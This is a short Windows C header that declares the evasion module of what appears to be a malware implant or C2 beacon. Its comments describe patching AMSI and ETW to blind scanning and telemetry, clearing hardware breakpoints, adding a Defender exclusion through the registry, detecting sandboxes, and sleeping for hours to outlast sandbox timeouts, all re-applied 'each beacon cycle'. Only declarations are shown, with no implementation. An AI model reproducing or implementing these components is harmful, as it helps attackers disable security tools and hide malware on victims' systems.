#pragma once
#include <windows.h>

// ─── Evasion techniques ────────────────────────────────────

// AMSI bypass – patch AmsiScanBuffer (and related) to return clean
BOOL PatchAMSI();

// ETW bypass – patch EtwEventWrite family to no-op
BOOL PatchETW();

// Clear hardware breakpoints (DR0–DR7) on all threads
BOOL ClearHardwareBreakpoints();

// Add Defender exclusion (registry-based, no PowerShell)
BOOL AddDefenderExclusion(const wchar_t* exePath);

// Re-apply all evasion techniques (called each beacon cycle)
VOID ReapplyEvasion();

// Sandbox detection (CPUID + uptime)
BOOL SandboxCheck();

// Deep sleep (1–4 hours) – used to outlast sandbox timeouts
VOID DeepSleep();

// Sleep evasion — block OS from suspending during beacon activity
VOID AcquireWakeLock();
VOID ReleaseWakeLock();